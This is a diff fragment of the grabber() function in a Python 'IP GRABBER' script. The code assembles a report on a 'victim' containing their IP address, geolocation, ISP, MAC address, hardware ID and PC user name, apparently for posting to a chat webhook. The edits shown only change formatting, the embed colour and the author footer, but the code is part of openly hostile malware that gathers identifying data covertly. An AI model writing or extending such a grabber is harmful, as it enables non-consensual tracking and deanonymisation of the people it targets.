@@ -60,26 +60,25 @@ def grabber():
                 {
                     "title": f"{victim} | IP: {ip}",
                     "description": f"**Location**"
-                                   f"```python"
-                                   f"Country: {data['country']} |  Region: {data['regionName']} | City: {data['city']}"
-                                   f"Lat: {data['lat']} | Lon: {data['lon']} \nISP: {data['isp']}"
-                                   f"ORG: {data['org']}"
-                                   f"AS: {data['as']}"
-                                   f"MAC: {mac}"
-                                   f"HWID: {hwid}"
-                                   f"PC-USER: {pcname}```"
-                                   f"**Time Started:** "
-                                   f"```python"
-                                   f"{datetime.now().strftime('%H:%M:%S')}\n```",
-                    "color": 5814783,
+                                       f"```python"
+                                           f"Country: {data['country']} |  Region: {data['regionName']} | City: {data['city']}"
+                                           f"Lat: {data['lat']} | Lon: {data['lon']} \nISP: {data['isp']}"
+                                           f"ORG: {data['org']}"
+                                           f"AS: {data['as']}"
+                                           f"MAC: {mac}"
+                                           f"HWID: {hwid}"
+                                           f"PC-USER: {pcname}```"
+                                           f"**Time Started:** "
+                                       f"```python"
+                                           f"{datetime.now().strftime('%H:%M:%S')}\n```",
+                    "color": 7419530,
                     "footer": {
-                        "text": "IP GRABBER BY Whaxor#9999 | Skid Proof",
+                        "text": "IP GRABBER BY Whaxor#9999",
                         "icon_url": "https://toppng.com/uploads/preview/drawn-logo-vans-cool-logos-easy-to-draw-11563244767orfuvwe9u4.png"
                     },
                     "timestamp": str(datetime.utcnow())
                 }
             ]
-
         }
     )
     
